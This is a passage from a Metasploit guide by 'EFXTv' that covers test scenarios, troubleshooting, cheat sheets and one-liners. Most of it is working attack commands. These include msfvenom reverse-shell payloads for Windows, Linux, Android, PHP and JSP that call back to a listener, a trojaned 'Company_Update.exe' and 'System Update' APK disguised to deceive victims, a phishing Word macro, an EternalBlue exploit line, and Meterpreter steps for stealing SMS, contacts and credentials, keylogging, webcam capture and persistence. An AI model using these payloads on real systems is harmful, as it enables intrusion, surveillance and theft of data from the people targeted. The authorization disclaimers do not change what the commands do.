jadx -d jadx_output/ target.apk

# Phase 2: Dynamic Analysis Setup
# Generate test payload (authorized testing only)
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o test_payload.apk

# Start listener
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit -j

# Phase 3: On-Device Testing
# Install on test device
adb install test_payload.apk
adb install target.apk

# Phase 4: Runtime Analysis
# After getting session:
meterpreter > sysinfo
meterpreter > dump_sms
meterpreter > dump_contacts
meterpreter > dump_calls

# Phase 5: Network Analysis
# Configure proxy
# Analyze traffic for sensitive data exposure

# Phase 6: Report
```

### 27.3 Scenario 3: Social Engineering Assessment

```bash
# ==========================================
#       SCENARIO: Social Engineering Test
# ==========================================

# Given: Authorization to test employee security awareness
# Goal: Demonstrate risks through controlled phishing

# Phase 1: Setup
# Generate payload with custom appearance
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    -e x64/xor_dynamic \
    -i 5 \
    -x /path/to/legitimate_app.exe \
    -k \
    -f exe \
    -o "Company_Update.exe"

# Phase 2: Create delivery mechanism
# Generate Office macro
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set FILENAME Q4_Report.docm
exploit

# Phase 3: Setup listener
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set ExitOnSession false
exploit -j

# Phase 4: Deliver (using authorized phishing platform)
# Track opens, clicks, and payload executions

# Phase 5: Document
# Track who clicked, what data was accessible
# Generate training recommendations
```

---

## 28. Troubleshooting Common Issues

### 28.1 Connection Issues

```bash
# ==========================================
#       PROBLEM: Handler not receiving connections
# ==========================================

# Check 1: Verify listener is running
jobs -l

# Check 2: Verify port is listening
netstat -tlnp | grep 4444

# Check 3: Check firewall
sudo iptables -L -n
sudo ufw status

# Check 4: Verify LHOST/LPORT in payload match handler
# Payload must have same LHOST/LPORT as handler

# Check 5: Check NAT/VPN
# If behind NAT, use your public IP
curl ifconfig.me

# ==========================================
#       PROBLEM: Payload not executing
# ==========================================

# Check 1: Verify payload matches target architecture
# x86 payload won't work on x64 system

# Check 2: Check AV blocking
# Try encoding or evasion techniques

# Check 3: Check target firewall
# Try reverse_http/https instead of reverse_tcp

# Check 4: Verify APK is signed (for Android)
apksigner verify payload.apk

# ==========================================
#       PROBLEM: Session dies immediately
# ==========================================

# Check 1: Set ExitOnSession false
set ExitOnSession false

# Check 2: Use stable process for migration
migrate -N explorer.exe

# Check 3: Check network stability
# Use HTTP/HTTPS for unreliable networks

# Check 4: Increase timeouts
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 86400
set SessionRetryTotal 3600

# ==========================================
#       PROBLEM: Database connection failed
# ==========================================

# Check 1: Verify PostgreSQL is running
sudo systemctl status postgresql

# Check 2: Reinitialize database
sudo msfdb reinit

# Check 3: Check configuration
cat ~/.msf4/database.yml

# Check 4: Manual connection
db_connect user:pass@localhost/msf_database
```

### 28.2 Performance Issues

```bash
# ==========================================
#       PROBLEM: Metasploit is slow
# ==========================================

# Solution 1: Use fewer threads
set THREADS 5  # Instead of 50

# Solution 2: Reduce timeout
set TIMEOUT 5  # Seconds

# Solution 3: Use specific target ranges
set RHOSTS 192.168.1.20  # Instead of 192.168.1.0/24

# Solution 4: Disable verbose output
set VERBOSE false

# Solution 5: Use database efficiently
db_nmap instead of nmap  # Results go directly to database
```

### 28.3 Module Issues

```bash
# ==========================================
#       PROBLEM: Module not found
# ==========================================

# Solution 1: Update Metasploit
sudo msfupdate

# Solution 2: Rebuild cache
msf6 > db_rebuild_cache

# Solution 3: Search with different terms
search eternalblue
search ms17-010
search cve-2017-0144

# Solution 4: Check module path
ls /opt/metasploit-framework/modules/

# ==========================================
#       PROBLEM: Payload generation fails
# ==========================================

# Check 1: Verify msfvenom syntax
msfvenom -h

# Check 2: Check available payloads
msfvenom -l payloads

# Check 3: Verify LHOST format
# Use IP address, not hostname (unless DNS works)

# Check 4: Check bad characters
# Some payloads don't support certain characters
```

---

## 29. Cheat Sheets

### 29.1 Metasploit Quick Reference

```
╔═══════════════════════════════════════════════════════════════════╗
║                   METASPLOIT CHEAT SHEET                          ║
║                     Author: EFXTv                                 ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  START:        msfconsole                                          ║
║  HELP:         help, <cmd> -h                                      ║
║  SEARCH:       search <keyword>, search type:exploit platform:win  ║
║  USE:          use <module>, use <number>                          ║
║  OPTIONS:      show options, show advanced, show targets           ║
║  SET:          set <option> <value>, setg <option> <value>         ║
║  RUN:          exploit, run, exploit -j (background)               ║
║  SESSIONS:     sessions -l, sessions -i <id>, sessions -k <id>    ║
║  JOBS:         jobs -l, jobs -k <id>                               ║
║  ROUTE:        route add <subnet>/<mask> <session_id>              ║
║  RESOURCE:     resource <script.rc>                                ║
║  DB:           db_status, hosts, services, vulns, creds            ║
║  EXIT:         exit, quit                                          ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 29.2 Msfvenom Cheat Sheet

```
╔═══════════════════════════════════════════════════════════════════╗
║                      MSFVENOM CHEAT SHEET                         ║
║                       Author: EFXTv                               ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  LIST PAYLOADS:    msfvenom -l payloads                            ║
║  LIST ENCODERS:    msfvenom -l encoders                            ║
║  LIST FORMATS:     msfvenom -l formats                             ║
║  LIST PLATFORMS:   msfvenom -l platforms                           ║
║                                                                    ║
║  ════════ FORMAT: msfvenom -p <payload> LHOST=<ip> LPORT=<port> ║
║                  -f <format> -o <output>                           ║
║                                                                    ║
║  ════════ WINDOWS ═══════                                          ║
║  EXE:      msfvenom -p windows/x64/meterpreter/reverse_tcp \      ║
║            LHOST=ip LPORT=port -f exe -o shell.exe                 ║
║  DLL:      ... -f dll -o shell.dll                                 ║
║  MSI:      ... -f msi -o shell.msi                                 ║
║  POWERSHELL: ... -f psh-cmd -o shell.bat                           ║
║  VBA:      ... -f vba-psh -o macro.vba                             ║
║  C#:       ... -f csharp -o shell.cs                               ║
║                                                                    ║
║  ════════ LINUX ═══════                                            ║
║  ELF:      msfvenom -p linux/x64/meterpreter/reverse_tcp \        ║
║            LHOST=ip LPORT=port -f elf -o shell                     ║
║                                                                    ║
║  ════════ ANDROID ═══════                                          ║
║  APK:      msfvenom -p android/meterpreter/reverse_tcp \           ║
║            LHOST=ip LPORT=port -f apk -o shell.apk                 ║
║                                                                    ║
║  ════════ WEB ═══════                                              ║
║  PHP:      msfvenom -p php/meterpreter/reverse_tcp \               ║
║            LHOST=ip LPORT=port -f raw -o shell.php                 ║
║  JSP:      ... -f raw -o shell.jsp                                 ║
║  WAR:      ... -f war -o shell.war                                 ║
║  PYTHON:   ... -f raw -o shell.py                                  ║
║  RUBY:     ... -f raw -o shell.rb                                  ║
║                                                                    ║
║  ════════ RAW ═══════                                              ║
║  SHELLCODE: ... -f raw -o shellcode.bin                            ║
║  HEX:       ... -f hex                                              ║
║  C:         ... -f c                                                ║
║  PYTHON:    ... -f py                                               ║
║  JAVA:      ... -f jar -o shell.jar                                ║
║                                                                    ║
║  ════════ OPTIONS ═══════                                          ║
║  -e <encoder>      Use encoder                                     ║
║  -i <iterations>   Encoding iterations                             ║
║  -n <nops>         NOP sled length                                 ║
║  -x <template>     Custom template                                 ║
║  -k                Keep template behavior                           ║
║  --smallest        Use smallest payload                             ║
║  --app-name <name> Android app name                                ║
║  --app-icon <path> Android app icon                                ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 29.3 Meterpreter Cheat Sheet

```
╔═══════════════════════════════════════════════════════════════════╗
║                   METERPRETER CHEAT SHEET                         ║
║                      Author: EFXTv                                ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  ════════ CORE ═══════                                             ║
║  help              Show all commands                               ║
║  background/bg     Background session                              ║
║  exit/quit         Close session                                   ║
║  info              Session info                                    ║
║  irb               Interactive Ruby shell                          ║
║  pry               Start Pry debugger                              ║
║                                                                    ║
║  ════════ SYSTEM ═══════                                           ║
║  sysinfo           System information                              ║
║  getuid            Current user                                    ║
║  getpid            Current process ID                              ║
║  getprivs          List privileges                                 ║
║  getsystem         Privilege escalation                            ║
║  pgrep <name>      Find process                                    ║
║  ps                List processes                                  ║
║  migrate <pid>     Migrate to process                              ║
║  shell             System shell                                    ║
║  reboot            Reboot system                                   ║
║                                                                    ║
║  ════════ FILE SYSTEM ═══════                                      ║
║  pwd               Print working directory                         ║
║  cd <path>         Change directory                                ║
║  ls/dir            List files                                      ║
║  cat <file>        Read file                                       ║
║  download <f>      Download file                                   ║
║  upload <f>        Upload file                                     ║
║  edit <file>       Edit file                                       ║
║  search -f <pat>   Search for files                                ║
║  mkdir <dir>       Create directory                                ║
║  rm <file>         Delete file                                     ║
║                                                                    ║
║  ════════ NETWORK ═══════                                          ║
║  ifconfig/ipconfig Network interfaces                              ║
║  netstat           Network connections                             ║
║  arp               ARP table                                       ║
║  route             Routing table                                   ║
║  portfwd add       Port forwarding                                 ║
║  portfwd list      List port forwards                              ║
║  portfwd flush     Remove all forwards                             ║
║  resolve <host>    DNS resolution                                  ║
║                                                                    ║
║  ════════ UI ═══════                                               ║
║  screenshot        Take screenshot                                 ║
║  screenshare       Live screen                                     ║
║  webcam_snap       Take photo                                      ║
║  webcam_list       List webcams                                    ║
║  record_mic        Record audio                                    ║
║  keyscan_start     Start keylogger                                 ║
║  keyscan_dump      Dump keystrokes                                 ║
║  keyscan_stop      Stop keylogger                                  ║
║  idletime          Idle time                                       ║
║                                                                    ║
║  ════════ CREDENTIALS ═══════                                      ║
║  hashdump          Dump SAM hashes                                 ║
║  load kiwi         Load Mimikatz                                   ║
║  creds_all         All credentials                                 ║
║  lsa_dump_sam      Dump SAM                                        ║
║  lsa_dump_secrets  Dump LSA secrets                                ║
║                                                                    ║
║  ════════ EXTENSIONS ═══════                                       ║
║  load <ext>        Load extension                                  ║
║  load kiwi         Mimikatz                                        ║
║  load incognito    Token manipulation                              ║
║  load sniffer      Packet capture                                  ║
║  load powershell   PowerShell                                      ║
║  load python       Python                                          ║
║                                                                    ║
║  ════════ PRIVILEGE ESCALATION ═══════                             ║
║  getsystem         Auto privesc                                    ║
║  load incognito    Token impersonation                             ║
║  impersonate_token "DOMAIN\\User"                                  ║
║  list_tokens -u    List user tokens                                ║
║                                                                    ║
║  ════════ PERSISTENCE ═══════                                      ║
║  run persistence   Install persistence                             ║
║  run metsvc        Install Meterpreter service                     ║
║                                                                    ║
║  ════════ ANDROID-SPECIFIC ═══════                                 ║
║  dump_sms          Dump SMS messages                               ║
║  dump_contacts     Dump contacts                                   ║
║  dump_calls        Dump call logs                                  ║
║  wlan_geolocate    WiFi geolocation                                ║
║  webcam_snap       Take photo                                      ║
║  record_mic        Record audio                                    ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 29.4 Useful One-Liners

```bash
# ==========================================
#       MSFCONSOLE ONE-LINERS
# ==========================================

# Start handler and wait for session
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; set ExitOnSession false; exploit -j"

# Android handler
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; exploit"

# Quick scan
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set THREADS 50; run; exit"

# EternalBlue check and exploit
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.20; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.10; exploit"

# ==========================================
#       MSFVENOM ONE-LINERS
# ==========================================

# Windows reverse shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell (elf)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell

# Android reverse shell (apk)
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f apk -o shell.apk

# PHP webshell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.py

# PowerShell reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh-cmd -o shell.bat

# JSP webshell (WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war -o shell.war

# Encoded Windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor_dynamic -i 10 -f exe -o encoded.exe

# Android with custom name
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 --app-name "System Update" -f apk -o update.apk
```

---

## 30. Resources & Further Learning

### 30.1 Official Documentation

```
OFFICIAL RESOURCES:
├── Metasploit Documentation
│   ├── https://docs.metasploit.com/
│   ├── https://www.metasploit.com/get-started
│   └── https://github.com/rapid7/metasploit-framework/wiki
│
├── Rapid7 Blog
│   ├── https://www.rapid7.com/blog/
│   └── https://blog.rapid7.com/
│
├── Metasploit Unleashed
│   └── https://www.offsec.com/metasploit-unleashed/
│
└── Offensive Security
    ├── https://www.offsec.com/
    └── OSCP Certification
```

### 30.2 Practice Platforms

```
PRACTICE ENVIRONMENTS:
├── Metasploitable 2 & 3
│   ├── https://sourceforge.net/projects/metasploitable/
│   └── Intentionally vulnerable VMs
│
├── HackTheBox
│   ├── https://www.hackthebox.eu/
│   └── Online penetration testing labs
│
├── TryHackMe
│   ├── https://tryhackme.com/
│   └── Guided learning paths
│
├── VulnHub
│   ├── https://www.vulnhub.com/
│   └── Downloadable vulnerable VMs
│
├── PentesterLab
│   ├── https://pentesterlab.com/
│   └── Web application security
│
└── DVWA (Damn Vulnerable Web Application)
    └── https://github.com/digininja/DVWA
```

### 30.3 Certifications

```
SECURITY CERTIFICATIONS:
├── Offensive Security
│   ├── OSCP - Offensive Security Certified Professional
│   ├── OSEP - OffSec Experienced Penetration Tester
│   ├── OSED - OffSec Security Exploit Developer
│   └── OSWE - OffSec Web Expert
│
├── SANS/GIAC
│   ├── GPEN - GIAC Penetration Tester
│   ├── GXPN - GIAC Exploit Researcher
│   ├── GWAPT - GIAC Web Application Penetration Tester
│   └── GMOB - GIAC Mobile Device Security Analyst
│
├── EC-Council
│   ├── CEH - Certified Ethical Hacker
│   ├── ECSA - EC-Council Security Analyst
│   └── LPT - Licensed Penetration Tester
│
└── Other
    ├── CompTIA PenTest+
    ├── CREST CRT - Certified Red Team Professional
    └── eJPT/eCPPT - eLearnSecurity certifications
```

### 30.4 Books

```
RECOMMENDED READING:
├── "Metasploit: The Penetration Tester's Guide" 
│   - David Kennedy, Jim O'Gorman, Devon Kearns, Mati Aharoni
│
├── "Penetration Testing" 
│   - Georgia Weidman
│
├── "The Hacker Playbook 3" 
│   - Peter Kim
│
├── "Black Hat Python, 2nd Edition" 
│   - Justin Seitz & Tim Arnold
│
├── "The Web Application Hacker's Handbook" 
│   - Dafydd Stuttard & Marcus Pinto
│
├── "Android Hacker's Handbook" 
│   - Joshua Drake et al.
│
└── "Red Team Field Manual (RTFM)" 
    - Ben Clark
```

### 30.5 Community

```
COMMUNITIES:
├── Reddit
│   ├── r/netsec
│   ├── r/AskNetsec
│   ├── r/Metasploit
│   └── r/HowToHack
│
├── Discord Servers
│   ├── NetSec Students
│   ├── The Cyber Mentor
│   └── InfoSec Community
│
├── Twitter/X
│   ├── @metasploit
│   ├── @rapid7
│   ├── @offaboratorysec
│   └── Security researchers
│
└── Conferences
    ├── DEF CON
    ├── Black Hat
    ├── BSides (local events)
    ├── Wild West Hackin' Fest
    └── HackRedCon
```

---

## Final Words from EFXTv

```
╔═══════════════════════════════════════════════════════════════════╗
║                                                                    ║
║              "With great power comes great responsibility"         ║
║                                                                    ║
║   This guide provides the knowledge to understand and use          ║
║   Metasploit for legitimate security testing. Always remember:     ║
║                                                                    ║
║   ✓ Get WRITTEN AUTHORIZATION before testing                       ║
║   ✓ Stay within your DEFINED SCOPE                                 ║
║   ✓ Document EVERYTHING                                            ║
║   ✓ Report findings RESPONSIBLY                                    ║
║   ✓ Never cause HARM to systems or data                            ║
║   ✓ Respect PRIVACY and CONFIDENTIALITY                            ║
║   ✓ Keep LEARNING and IMPROVING                                    ║
║   ✓ Give back to the COMMUNITY                                     ║
║                                                                    ║
║   The security community thrives on ethical practices.             ║
║   Use these skills to make the digital world SAFER.                ║
║                                                                    ║
║   Happy Hacking! (Ethically, of course)                            ║
║                                                                    ║
║                                    - EFXTv                         ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

**Document Information:**
- **Title:** Metasploit Framework: The Complete Professional Guide
- **Author:** EFXTv
- **Version:** 2.0
- **Last Updated:** July 2026
- **Pages:** Comprehensive
- **Classification:** For Authorized Security Professionals

---

*This document is provided for educational and authorized security testing purposes only. The author (EFXTv) is not responsible for any misuse of this information. Always obtain proper authorization before conducting any security testing.*
